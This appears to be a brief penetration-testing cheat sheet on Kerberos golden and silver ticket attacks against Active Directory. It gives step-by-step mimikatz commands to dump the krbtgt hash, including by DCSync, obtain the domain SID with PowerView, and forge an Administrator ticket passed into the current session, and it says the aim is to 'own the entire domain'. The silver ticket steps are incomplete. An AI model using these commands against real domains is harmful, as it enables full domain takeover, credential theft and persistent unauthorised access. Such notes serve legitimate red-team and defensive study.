# GOLDEN TICKET

## Dump krbtgt hash to own the entire domain!

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:krbtgt

#### 4) kerberos::golden /user:Administrator /domain:domain.local /sid:SID /krbtgt:NTLM HASH /id:500(Admin) or 1103(Service)

#### 5) misc::cmd

# SILVER TICKET

#### 1) mimikatz.exe

#### 2) privilege::debug

#### 3) lsadump::lsa /inject /name:SERVICE/DOMAIN ADMIN


# Golden Ticket

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `lsadump::dcsync /domain:eagle.local /user:krbtgt`           | Command used in `mimikatz` to DCSync and dump the `krbtgt` password hash |
| `Get-DomainSID`                                              | Cmdlet from `PowerView` used to obtain the SID value of the domain. |
| `golden /domain:eagle.local /sid:<domain sid> /rc4:<rc4 hash> /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt` | Command used in `mimikatz` to forge a golden ticket for the `Administrator` account and pass the ticket to the current session |
| `klist`                                                      | Command line utility in Windows to display the contents of the Kerberos ticket cache. |
